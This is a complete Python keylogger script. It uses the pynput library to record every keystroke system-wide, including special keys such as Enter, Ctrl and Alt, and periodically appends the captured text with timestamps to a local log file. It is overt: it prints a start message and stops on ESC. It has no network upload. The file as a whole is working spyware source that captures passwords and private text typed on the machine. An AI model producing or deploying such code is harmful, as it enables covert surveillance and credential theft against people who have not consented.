import logging
import threading
import argparse
import sys
from pynput import keyboard
from datetime import datetime

class KeyLogger:
    def __init__(self, interval: int = 60, log_file: str = "keylog.txt"):
        self.interval = interval
        self.log_file = log_file
        self.log = ""
        logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
        self.logger = logging.getLogger(__name__)
        self.key_map = {
            keyboard.Key.space: " ",
            keyboard.Key.enter: " [ENTER] ",
            keyboard.Key.backspace: " [BACKSPACE] ",
            keyboard.Key.tab: " [TAB] ",
            keyboard.Key.caps_lock: " [CAPS] ",
            keyboard.Key.shift: " [SHIFT] ",
            keyboard.Key.ctrl_l: " [CTRL] ",
            keyboard.Key.ctrl_r: " [CTRL] ",
            keyboard.Key.alt_l: " [ALT] ",
            keyboard.Key.alt_gr: " [ALT] "
        }

    def _on_press(self, key):
        if key == keyboard.Key.esc:
            self._report_to_file()
            return False
        
        try:
            current_key = str(key.char)
        except AttributeError:
            current_key = self.key_map.get(key, f" [{str(key).replace('Key.', '').upper()}] ")
        
        self.log += current_key

    def _report_to_file(self):
        if self.log:
            try:
                with open(self.log_file, "a", encoding="utf-8") as f:
                    f.write(f"\n--- {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ---\n{self.log}\n")
                self.logger.info(f"Log saved to {self.log_file}")
                self.log = ""
            except (PermissionError, Exception) as e:
                self.logger.error(f"Error saving log: {e}")

        timer = threading.Timer(self.interval, self._report_to_file)
        timer.daemon = True
        timer.start()

    def start(self):
        self.logger.info("KeyLogger started. Press ESC to stop.")
        timer = threading.Timer(self.interval, self._report_to_file)
        timer.daemon = True
        timer.start()

        with keyboard.Listener(on_press=self._on_press) as listener:
            listener.join()

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interval", type=int, default=60)
    parser.add_argument("-f", "--file", type=str, default="keylog.txt")
    args = parser.parse_args()

    logger = KeyLogger(interval=args.interval, log_file=args.file)
    try:
        logger.start()
    except KeyboardInterrupt:
        logger._report_to_file()
        sys.exit(0)
